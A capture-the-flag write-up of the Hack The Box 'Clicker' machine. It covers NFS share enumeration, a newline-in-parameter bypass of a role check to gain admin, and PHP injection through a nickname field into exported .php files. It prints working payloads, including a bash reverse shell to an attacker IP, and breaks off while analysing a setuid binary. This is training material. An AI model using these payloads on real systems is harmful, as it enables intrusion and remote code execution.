# Clicker
## Enumeration
### Port Scanning
We can find the open ports for ssh, http, rpcbind and nfs.
```
┌──(kali㉿kali)-[~]
└─$ nmap $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-08 16:07 EST
Nmap scan report for 10.10.11.232
Host is up (0.037s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
2049/tcp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds

┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV $IP   
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-08 16:09 EST
Nmap scan report for clicker.htb (10.10.11.232)
Host is up (0.033s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Clicker - The Game
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Ubuntu)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      45291/udp6  mountd
|   100005  1,2,3      49206/udp   mountd
|   100005  1,2,3      49439/tcp6  mountd
|   100005  1,2,3      60805/tcp   mountd
|   100021  1,3,4      32785/tcp6  nlockmgr
|   100021  1,3,4      34407/tcp   nlockmgr
|   100021  1,3,4      38958/udp6  nlockmgr
|   100021  1,3,4      39553/udp   nlockmgr
|   100024  1          33853/tcp6  status
|   100024  1          43617/tcp   status
|   100024  1          51689/udp   status
|   100024  1          56585/udp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.53 seconds

┌──(kali㉿kali)-[~]
└─$
```

You can find even more open ports:
```
┌──(kali㉿kali)-[~]
└─$ nmap -p- $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-08 16:11 EST
Nmap scan report for clicker.htb (10.10.11.232)
Host is up (0.031s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
34407/tcp open  unknown
34649/tcp open  unknown
43617/tcp open  unknown
46583/tcp open  unknown
60805/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.30 seconds

┌──(kali㉿kali)-[~]
└─$ 
```
We can connect to those ports with `nc` or `telnet`, but they don't respond with any data.

### http
The website provides a simple game called _Clicker_:

![Website](./images/website.png)

If you register you can play the game:

![Game](./images/game.png)

But besides this we don't find something interesting here. Also, no interesting files while enumeration:
```
┌──(kali㉿kali)-[~]
└─$ feroxbuster --url http://clicker.htb --depth 2 --wordlist /usr/share/dirb/wordlists/common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://clicker.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirb/wordlists/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      114l      266w     3221c http://clicker.htb/login.php
200      GET       50l       98w      733c http://clicker.htb/assets/cover.css
302      GET        0l        0w        0c http://clicker.htb/admin.php => http://clicker.htb/index.php
301      GET        9l       28w      311c http://clicker.htb/assets => http://clicker.htb/assets/
301      GET        9l       28w      312c http://clicker.htb/exports => http://clicker.htb/exports/
200      GET      107l      277w     2984c http://clicker.htb/index.php
200      GET      127l      319w     3343c http://clicker.htb/info.php
200      GET      114l      266w     3253c http://clicker.htb/register.php
200      GET        7l     1966w   155758c http://clicker.htb/assets/css/bootstrap.min.css
200      GET     5668l    32838w  2838184c http://clicker.htb/assets/background.png
200      GET      107l      277w     2984c http://clicker.htb/
301      GET        9l       28w      314c http://clicker.htb/assets/js => http://clicker.htb/assets/js/
301      GET        9l       28w      315c http://clicker.htb/assets/css => http://clicker.htb/assets/css/
[####################] - 11s    13858/13858   0s      found:13      errors:0      
[####################] - 9s      4614/4614    532/s   http://clicker.htb/ 
[####################] - 7s      4614/4614    630/s   http://clicker.htb/assets/ 
[####################] - 6s      4614/4614    801/s   http://clicker.htb/exports/

┌──(kali㉿kali)-[~]
└─$ 
```

But the website uses a PHPSESSID cookie to authenticate the user:

![PHPSESSID](./images/cookie.png)

Maybe that can be relevant later.

### rpcbind
Since NFS is also open on the system, those ports usually belong together.
```
┌──(kali㉿kali)-[~]
└─$ rpcinfo $IP
   program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100005    1    udp       0.0.0.0.235.90         mountd     superuser
    100005    1    tcp       0.0.0.0.181.247        mountd     superuser
    100005    1    udp6      ::.190.106             mountd     superuser
    100005    1    tcp6      ::.234.87              mountd     superuser
    100005    2    udp       0.0.0.0.234.179        mountd     superuser
    100005    2    tcp       0.0.0.0.135.89         mountd     superuser
    100005    2    udp6      ::.156.20              mountd     superuser
    100005    2    tcp6      ::.160.47              mountd     superuser
    100005    3    udp       0.0.0.0.192.54         mountd     superuser
    100005    3    tcp       0.0.0.0.237.133        mountd     superuser
    100005    3    udp6      ::.176.235             mountd     superuser
    100005    3    tcp6      ::.193.31              mountd     superuser
    100024    1    udp       0.0.0.0.201.233        status     116
    100024    1    tcp       0.0.0.0.170.97         status     116
    100024    1    udp6      ::.221.9               status     116
    100024    1    tcp6      ::.132.61              status     116
    100003    3    tcp       0.0.0.0.8.1            nfs        superuser
    100003    4    tcp       0.0.0.0.8.1            nfs        superuser
    100227    3    tcp       0.0.0.0.8.1            nfs_acl    superuser
    100003    3    tcp6      ::.8.1                 nfs        superuser
    100003    4    tcp6      ::.8.1                 nfs        superuser
    100227    3    tcp6      ::.8.1                 nfs_acl    superuser
    100021    1    udp       0.0.0.0.154.129        nlockmgr   superuser
    100021    3    udp       0.0.0.0.154.129        nlockmgr   superuser
    100021    4    udp       0.0.0.0.154.129        nlockmgr   superuser
    100021    1    tcp       0.0.0.0.134.103        nlockmgr   superuser
    100021    3    tcp       0.0.0.0.134.103        nlockmgr   superuser
    100021    4    tcp       0.0.0.0.134.103        nlockmgr   superuser
    100021    1    udp6      ::.152.46              nlockmgr   superuser
    100021    3    udp6      ::.152.46              nlockmgr   superuser
    100021    4    udp6      ::.152.46              nlockmgr   superuser
    100021    1    tcp6      ::.128.17              nlockmgr   superuser
    100021    3    tcp6      ::.128.17              nlockmgr   superuser
    100021    4    tcp6      ::.128.17              nlockmgr   superuser

┌──(kali㉿kali)-[~]
└─$ 
```

Interesting points are the nfs and mountd ones. But that usually only means that nfs shares are available. So we can enumerate there further.

### nfs
From our nmap scan, we know that the nfs version is 3 or 4:
```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -p2049 $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-08 16:32 EST
Nmap scan report for clicker.htb (10.10.11.232)
Host is up (0.032s latency).

PORT     STATE SERVICE VERSION
2049/tcp open  nfs     3-4 (RPC #100003)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.69 seconds
┌──(kali㉿kali)-[~]
└─$ 
```
We can enumerate the available shares:
```
┌──(kali㉿kali)-[~]
└─$ showmount -e $IP
Export list for 10.10.11.232:
/mnt/backups *

┌──(kali㉿kali)-[~]
└─$ 
```

We can also use a Metasploit module to scan the service, but it doesn't show anymore information:
```
msf6 auxiliary(scanner/nfs/nfsmount) > show options

Module options (auxiliary/scanner/nfs/nfsmount):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   HOSTNAME                   no        Hostname to match shares against
   LHOST     10.0.2.15        no        IP to match shares against
   PROTOCOL  udp              yes       The protocol to use (Accepted: udp, tcp)
   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     111              yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/nfs/nfsmount) > set RHOSTS clicker.htb
RHOSTS => clicker.htb
msf6 auxiliary(scanner/nfs/nfsmount) > run

[+] 10.10.11.232:111      - 10.10.11.232 Mountable NFS Export: /mnt/backups [*]
[*] clicker.htb:111       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/nfs/nfsmount) >
```

If we mount the share, we can find a backup of the _Clicker_ game:
```
┌──(kali㉿kali)-[~]
└─$ sudo mount -t nfs $IP:/mnt/backups /mnt -o nolock

┌──(kali㉿kali)-[/mnt]
└─$ ls -al
total 2276
drwxr-xr-x  2 nobody nogroup    4096 Sep  5 15:19 .
drwxr-xr-x 19 root   root      36864 Sep  3 16:08 ..
-rw-r--r--  1 root   root    2284115 Sep  1 16:27 clicker.htb_backup.zip

┌──(kali㉿kali)-[/mnt]
└─$ 
```
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/clicker]
└─$ unzip -l clicker.htb_backup.zip
Archive:  clicker.htb_backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2023-09-01 16:21   clicker.htb/
     3341  2023-09-01 16:17   clicker.htb/play.php
     3070  2023-09-01 16:17   clicker.htb/profile.php
      608  2023-09-01 16:17   clicker.htb/authenticate.php
      541  2023-09-01 16:17   clicker.htb/create_player.php
       74  2023-09-01 16:17   clicker.htb/logout.php
        0  2023-02-28 05:04   clicker.htb/assets/
  1548311  2023-02-28 05:02   clicker.htb/assets/background.png
      733  2023-02-23 05:49   clicker.htb/assets/cover.css
    10912  2023-02-25 06:20   clicker.htb/assets/cursor.png
        0  2019-02-13 09:47   clicker.htb/assets/js/
   250568  2019-02-13 09:47   clicker.htb/assets/js/bootstrap.js.map
   311949  2019-02-13 09:47   clicker.htb/assets/js/bootstrap.bundle.min.js.map
   190253  2019-02-13 09:47   clicker.htb/assets/js/bootstrap.min.js.map
    78635  2019-02-13 09:47   clicker.htb/assets/js/bootstrap.bundle.min.js
    58072  2019-02-13 09:47   clicker.htb/assets/js/bootstrap.min.js
   222911  2019-02-13 09:47   clicker.htb/assets/js/bootstrap.bundle.js
   402249  2019-02-13 09:47   clicker.htb/assets/js/bootstrap.bundle.js.map
   131637  2019-02-13 09:47   clicker.htb/assets/js/bootstrap.js
        0  2019-02-13 09:47   clicker.htb/assets/css/
     4021  2019-02-13 09:47   clicker.htb/assets/css/bootstrap-reboot.min.css
     4897  2019-02-13 09:47   clicker.htb/assets/css/bootstrap-reboot.css
    32461  2019-02-13 09:47   clicker.htb/assets/css/bootstrap-reboot.min.css.map
   625953  2019-02-13 09:47   clicker.htb/assets/css/bootstrap.min.css.map
   492048  2019-02-13 09:47   clicker.htb/assets/css/bootstrap.css.map
    64548  2019-02-13 09:47   clicker.htb/assets/css/bootstrap-grid.css
   108539  2019-02-13 09:47   clicker.htb/assets/css/bootstrap-grid.min.css.map
    48488  2019-02-13 09:47   clicker.htb/assets/css/bootstrap-grid.min.css
   155758  2019-02-13 09:47   clicker.htb/assets/css/bootstrap.min.css
   151749  2019-02-13 09:47   clicker.htb/assets/css/bootstrap-grid.css.map
   192348  2019-02-13 09:47   clicker.htb/assets/css/bootstrap.css
    76483  2019-02-13 09:47   clicker.htb/assets/css/bootstrap-reboot.css.map
     3301  2023-09-01 16:18   clicker.htb/login.php
     3934  2023-09-01 16:18   clicker.htb/admin.php
     3423  2023-09-01 16:18   clicker.htb/info.php
     1376  2023-09-01 16:18   clicker.htb/diagnostic.php
      563  2023-09-01 16:18   clicker.htb/save_game.php
     3333  2023-09-01 16:18   clicker.htb/register.php
     3887  2023-09-01 16:18   clicker.htb/index.php
     2536  2023-09-01 16:18   clicker.htb/db_utils.php
        0  2023-09-01 16:18   clicker.htb/exports/
     1977  2023-09-01 16:18   clicker.htb/export.php
---------                     -------
  5195487                     42 files

┌──(kali㉿kali)-[~/Desktop/hackthebox/clicker]
└─$ 
```

## _Clicker_ backup
### `db_utils.php`
In the database configuration are some useful information:
```
[...]

$db_server="localhost";
$db_username="clicker_db_user";
$db_password="clicker_db_password";
$db_name="clicker";
$mysqli = new mysqli($db_server, $db_username, $db_password, $db_name);
$pdo = new PDO("mysql:dbname=$db_name;host=$db_server", $db_username, $db_password);

[...]
```

As well this function:
```php
// ONLY FOR THE ADMIN
function get_top_players($number) {
        global $pdo;
        $stmt = $pdo->query("SELECT nickname,clicks,level FROM players WHERE clicks >= " . $number);
        $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
        return $result;
}
```

So there are admin users, and they can check the score of the other users and with that potential usernames.

The entries in the database has also a `role`, but it is set to `0` which probably means no admin:
```php
function create_new_player($player, $password) {
        global $pdo;
        $params = ["player"=>$player, "password"=>hash("sha256", $password)];
        $stmt = $pdo->prepare("INSERT INTO players(username, nickname, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)");
        $stmt->execute($params);
}
```

There is also a function that checks if a username is already used:
```php
function check_exists($player) {
        global $pdo;
        $params = ["player" => $player];
        $stmt = $pdo->prepare("SELECT count(*) FROM players WHERE username = :player");
        $stmt->execute($params);
        $result = $stmt->fetchColumn();
        if ($result > 0) {
                return true;
        }
        return false;
}
```
We can also verify a resulting error message:

![User exists](./images/exists.png)

That could be interesting for brute forcing a username.

### Brute forcing
I remember an info page with some user thoughts about the game. Here we can find some usernames. Could be worth a try:

![Username](./images/info.png)

If try to register users with those names, we can find out that all of them exist.

With that information we can try to brute force a password:
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/clicker]
└─$ cat usernames.txt 
ButtonLover99
Paol
Th3Br0
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/hackthebox/clicker]
└─$ wfuzz -c -z file,usernames.txt -z file,/home/kali/Desktop/tools/rockyou.txt --hs "Authentication Failed" --follow -u http://clicker.htb/authenticate.php -d "username=FUZZ&password=FUZ2Z"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

[...] 

```
But I couldn't find any logins.

I also tried the admin user because this was also existence:
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/clicker]
└─$ sudo hydra -v -l admin -P rockyou.txt clicker.htb http-post-form "/authenticate.php:username=admin&password=^PASS^:Authentication Failed"

[...] 
```

But no chance either.

### `save_game.php`
If we take a look into the `save_game.php` we find this function:
```php
if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
        $args = [];
        foreach($_GET as $key=>$value) {
                if (strtolower($key) === 'role') {
                        // prevent malicious users to modify role
                        header('Location: /index.php?err=Malicious activity detected!');
                        die;
                }
                $args[$key] = $value;
        }
        save_profile($_SESSION['PLAYER'], $_GET);
        // update session info
        $_SESSION['CLICKS'] = $_GET['clicks'];
        $_SESSION['LEVEL'] = $_GET['level'];
        header('Location: /index.php?msg=Game has been saved!');

}
```
The application uses a GET request to save the current state of the game. For example with: `/save_game.php?clicks=6&level=1`

But the interesting part is this condition:
```php
if (strtolower($key) === 'role') {
        // prevent malicious users to modify role
        header('Location: /index.php?err=Malicious activity detected!');
        die;
}
$args[$key] = $value;
```

It tries to prevent the modification of the `role` data field. We can verify this as well with the request `/save_game.php?clicks=6&level=1&role=1` to get this response:
 
![Malicious activity](./images/malicious_activity.png)

But we can also bypass this check with a [CRLF injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection). CR (Carriage Return: ASCII 13, \r) and LF (Line Feed: ASCII 10, \n) are used to terminate lines. In the HTTP protocol those sequences always terminate a line. So they can be abused to split HTTP responses. The encoded URL characters are `%0d` for CR and `%0a` for LF (URL encoded).

More information can also be found at [HackTricks](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a)

In our case those characters can bypass the condition. For example with `/save_game.php?clicks=6&level=1&role%0a=1` we will get a valid response:

![Game saved](./images/game_saved.png)

But we still don't have any admin options that we found in the PHP files. A quick lookup in the `admin.php` show that the application checks for the content `Admin`:
```php
if ($_SESSION["ROLE"] != "Admin") {
  header('Location: /index.php');
  die;
}
```

So I set it to `/save_game.php?clicks=6&level=1&role%0a=Admin` and got admin access:

![Admin](./images/admin.png)

### Remote Code Execution
In the administration section we have a scoreboard that we can export:

![Scoreboard](./images/scoreboard.png)

We can access this export over this path: `/exports/top_players_od45sy71.txt`

Let's inspect the `export.php`:
```php
if ($_POST["extension"] == "txt") {
    $s .= "Nickname: ". $currentplayer["nickname"] . " Clicks: " . $currentplayer["clicks"] . " Level: " . $currentplayer["level"] . "\n";
    foreach ($data as $player) {
    $s .= "Nickname: ". $player["nickname"] . " Clicks: " . $player["clicks"] . " Level: " . $player["level"] . "\n";
  }
} elseif ($_POST["extension"] == "json") {
  $s .= json_encode($currentplayer);
  $s .= json_encode($data);
} else {
  $s .= '<table>';
  $s .= '<thead>';
  $s .= '  <tr>';
  $s .= '    <th scope="col">Nickname</th>';
  $s .= '    <th scope="col">Clicks</th>';
  $s .= '    <th scope="col">Level</th>';
  $s .= '  </tr>';
  $s .= '</thead>';
  $s .= '<tbody>';
  $s .= '  <tr>';
  $s .= '    <th scope="row">' . $currentplayer["nickname"] . '</th>';
  $s .= '    <td>' . $currentplayer["clicks"] . '</td>';
  $s .= '    <td>' . $currentplayer["level"] . '</td>';
  $s .= '  </tr>';

  foreach ($data as $player) {
    $s .= '  <tr>';
    $s .= '    <th scope="row">' . $player["nickname"] . '</th>';
    $s .= '    <td>' . $player["clicks"] . '</td>';
    $s .= '    <td>' . $player["level"] . '</td>';
    $s .= '  </tr>';
  }
  $s .= '</tbody>';
  $s .= '</table>';
}

$filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
```

The export is created over a POST request with the parameters `threshold` and `extension`. So if we manipulate the extension to `.php` we could create a PHP file and access it.

Now we just have to inject a PHP command. But since the scoreboard lists all users and their scores, we can maybe create a user with an arbitrary name. For example `<?php exec("id"); ?>`. But this brings an error because of a restriction:
```php
if (! ctype_alnum($_POST["username"])) {
        header('Location: /register.php?err=Special characters are not allowed');
}
```

We have to try another way. I noticed that besides the `username` key exists also a `nickname` key which is also shown in the export:
```php
if ($_POST["extension"] == "txt") {
    $s .= "Nickname: ". $currentplayer["nickname"] . " Clicks: " . $currentplayer["clicks"] . " Level: " . $currentplayer["level"] . "\n";
    foreach ($data as $player) {
    $s .= "Nickname: ". $player["nickname"] . " Clicks: " . $player["clicks"] . " Level: " . $player["level"] . "\n";
  }
```

Since there is no normal way to set the nickname, we can set it also over the `save_game.php`. The file don't check for the keys itself except the `role`. So we can inject another key: `/save_game.php?clicks=5000&level=5&role%0a=Admin&nickname=mycoolnickname`

If we then create the export we find ourselves under the new nickname:
```
Nickname: mycoolnickname Clicks: 5000 Level: 5
Nickname: admin Clicks: 999999999999999999 Level: 999999999
Nickname: ButtonLover99 Clicks: 10000000 Level: 100
Nickname: Paol Clicks: 2776354 Level: 75
Nickname: Th3Br0 Clicks: 87947322 Level: 1
```

To inject a command over this key we can use this payload: `/save_game.php?clicks=5000&level=5&role%0a=Admin&nickname=<%3fphp+system("id")%3b+%3f>`

And get the PHP command in the export:
```
Nickname: <?php system("id"); ?> Clicks: 5000 Level: 5
Nickname: admin Clicks: 999999999999999999 Level: 999999999
Nickname: ButtonLover99 Clicks: 10000000 Level: 100
Nickname: Paol Clicks: 2776354 Level: 75
Nickname: Th3Br0 Clicks: 87947322 Level: 1
```

Now we can create the POST request to generate a PHP file. For example with Burp:

![PHP file](./images/php.png)

If we now access the file `exports/top_players_bph182y3.php` we get the proof for the successful command injection:
```
Nickname	Clicks	Level
uid=33(www-data) gid=33(www-data) groups=33(www-data)	5000	5
admin	999999999999999999	999999999
ButtonLover99	10000000	100
Paol	2776354	75
Th3Br0	87947322	1
```

With that information we can create a reverse shell if we use this command as nickname: `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.45.203/8080 0>&1'"); ?>`

The HTTP request would be `/save_game.php?clicks=5000&level=5&role%0a=Admin&nickname=<%3fphp+exec("/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.9.45.203/8081+0>%261'")%3b+%3f>`

If we now create another export in `.php` format and request that file we can catch our reverse shell:
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8081
Listening on 0.0.0.0 8081
Connection received on 10.10.11.232 51894
bash: cannot set terminal process group (1199): Inappropriate ioctl for device
bash: no job control in this shell
www-data@clicker:/var/www/clicker.htb/exports$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@clicker:/var/www/clicker.htb/exports$
```

## User flag
We find ourself in the export directory as the user `www-data`:
```
www-data@clicker:/var/www/clicker.htb/exports$ ls -al 
total 16
drwxr-xr-x 2 www-data www-data 4096 Dec 11 19:39 .
drwxr-xr-x 4 root     root     4096 Sep  5 19:19 ..
-rw-r--r-- 1 www-data www-data  303 Dec 11 19:38 top_players_92y9dt25.txt
-rw-r--r-- 1 www-data www-data  635 Dec 11 19:39 top_players_g0fao3nz.php
www-data@clicker:/var/www/clicker.htb/exports$ pwd
/var/www/clicker.htb/exports
www-data@clicker:/var/www/clicker.htb/exports$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@clicker:/var/www/clicker.htb/exports$
```

On the system exists a user with the name `jack`:
```
www-data@clicker:/var/www/clicker.htb/exports$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
jack:x:1000:1000:jack:/home/jack:/bin/bash
www-data@clicker:/var/www/clicker.htb/exports$ ls -al /home/
total 12
drwxr-xr-x  3 root root 4096 Sep  5 19:19 .
drwxr-xr-x 18 root root 4096 Sep  5 19:19 ..
drwxr-x---  7 jack jack 4096 Dec 11 19:19 jack
www-data@clicker:/var/www/clicker.htb/exports$
```

So our first step is to find a way to become this user.

### Database
From the `db_utils.php` we already know the database information:
```php
$db_server="localhost";
$db_username="clicker_db_user";
$db_password="clicker_db_password";
$db_name="clicker";
```

With that we can access the database:
```
www-data@clicker:/var/www/clicker.htb/exports$ mysql -h localhost -u clicker_db_user --password=clicker_db_password clicker
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 774
Server version: 8.0.34-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

Inhere we can extract the password hashes of the users:
```
mysql> show tables;
+-------------------+
| Tables_in_clicker |
+-------------------+
| players           |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from players;
+---------------+----------------------------------------------------------------------------+------------------------------------------------------------------+-------+--------------------+-----------+
| username      | nickname                                                                   | password                                                         | role  | clicks             | level     |
+---------------+----------------------------------------------------------------------------+------------------------------------------------------------------+-------+--------------------+-----------+
| admin         | admin                                                                      | ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82 | Admin | 999999999999999999 | 999999999 |
| ButtonLover99 | ButtonLover99                                                              | 55d1d58e17361fe78a61a96847b0e0226a0bc1a4e38a7b167c10b5cf513ca81f | User  |           10000000 |       100 |
| Paol          | Paol                                                                       | bff439c136463a07dac48e50b31a322a4538d1fac26bfb5fd3c48f57a17dabd3 | User  |            2776354 |        75 |
| testtest      | <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.18/8081 0>&1'"); ?> | 37268335dd6931045bdcdf92623ff819a64244b53d0e746d438797349d4da578 | Admin |               5000 |         5 |
| Th3Br0        | Th3Br0                                                                     | 3185684ff9fd84f65a6c3037c3214ff4ebdd0e205b6acea97136d23407940c01 | User  |           87947322 |         1 |
+---------------+----------------------------------------------------------------------------+------------------------------------------------------------------+-------+--------------------+-----------+
5 rows in set (0.00 sec)

mysql> 
```

The passwords are SHA256 hashed, and we already tried to brute force them. So here are no other useful information.

### `/opt`
In the `/opt` directory are some interesting files:
```
www-data@clicker:/var/www/clicker.htb/exports$ ls -alR /opt/
/opt/:
total 16
drwxr-xr-x  3 root root 4096 Jul 20 10:00 .
drwxr-xr-x 18 root root 4096 Sep  5 19:19 ..
drwxr-xr-x  2 jack jack 4096 Jul 21 22:29 manage
-rwxr-xr-x  1 root root  504 Jul 20 10:00 monitor.sh

/opt/manage:
total 28
drwxr-xr-x 2 jack jack  4096 Jul 21 22:29 .
drwxr-xr-x 3 root root  4096 Jul 20 10:00 ..
-rw-rw-r-- 1 jack jack   256 Jul 21 22:29 README.txt
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 execute_query
www-data@clicker:/var/www/clicker.htb/exports$
```

Let's take a closer look into that `manage/` folder:
```
www-data@clicker:/opt$ cat /opt/manage/README.txt 
Web application Management

Use the binary to execute the following task:
        - 1: Creates the database structure and adds user admin
        - 2: Creates fake players (better not tell anyone)
        - 3: Resets the admin password
        - 4: Deletes all users except the admin
www-data@clicker:/opt$
```

So seems like the binary creates the database with the first users.

### Reversing
The executable is not stripped, and we can find some interesting strings in there. So might be worth to reverse it.

If we download the file and throw it into Ghidra we get the following code:
```c
  if (param_1 < 2) {
    puts("ERROR: not enough arguments");
    uVar3 = 1;
  }
  else {
    iVar2 = atoi(*(char **)(param_2 + 8));
    pcVar4 = (char *)calloc(0x14,1);
    switch(iVar2) {
    case 0:
      puts("ERROR: Invalid arguments");
      uVar3 = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(pcVar4,"create.sql",0x14);
      break;
    case 2:
      strncpy(pcVar4,"populate.sql",0x14);
      break;
    case 3:
      strncpy(pcVar4,"reset_password.sql",0x14);
      break;
    case 4:
      strncpy(pcVar4,"clean.sql",0x14);
      break;
    default:
      strncpy(pcVar4,*(char **)(param_2 + 16),20);
    }
    local_98[0] = '/home/jack/queries/\0';
    sVar5 = strlen(local_98);
    sVar6 = strlen(pcVar4);
    __dest = (char *)calloc(sVar6 + sVar5 + 1,1);
    strcat(__dest,local_98);
    strcat(__dest,pcVar4);
    setreuid(1000,1000);
    iVar2 = access(__dest,4);
    if (iVar2 == 0) {
      local_78[0] = '/usr/bin/mysql -u clicker_db_user --password=\'clicker_db_password\' clicker -v < \0';
      sVar5 = strlen(local_78);
      sVar6 = strlen(pcVar4);
      pcVar4 = (char *)calloc(sVar6 + sVar5 + 1,1);
      strcat(pcVar4,local_78);
      strcat(pcVar4,__dest);
      system(pcVar4);
    }
    else {
      puts("File not readable or not found");
    }
```

Depending on our input (1, 2, 3, 4) it builds a MySQL command and executes it. For example for the option _1_ the command would be:
```
/usr/bin/mysql -u clicker_db_user --password=\'clicker_db_password\' clicker -v < /home/jack/queries/create.sql
```

But the program has a flaw at the switch case:
```c
default:
      strncpy(pcVar4,*(char **)(param_2 + 16),20);
    }
```

So if the input is none of [0, 1, 2, 3, 4] it will use the next CLI parameter for the creation of the SQL file path. For example we can use those commands to execute the same SQL file:
```
www-data@clicker:/opt/manage$ ./execute_query 1  
www-data@clicker:/opt/manage$ ./execute_query 5 create.sql
```

See the output:
```
www-data@clicker:/opt/manage$ ./execute_query 1  
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
CREATE TABLE IF NOT EXISTS players(username varchar(255), nickname varchar(255), password varchar(255), role varchar(255), clicks bigint, level int, PRIMARY KEY (username))
--------------

--------------
INSERT INTO players (username, nickname, password, role, clicks, level) 
        VALUES ('admin', 'admin', 'ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82', 'Admin', 999999999999999999, 999999999)
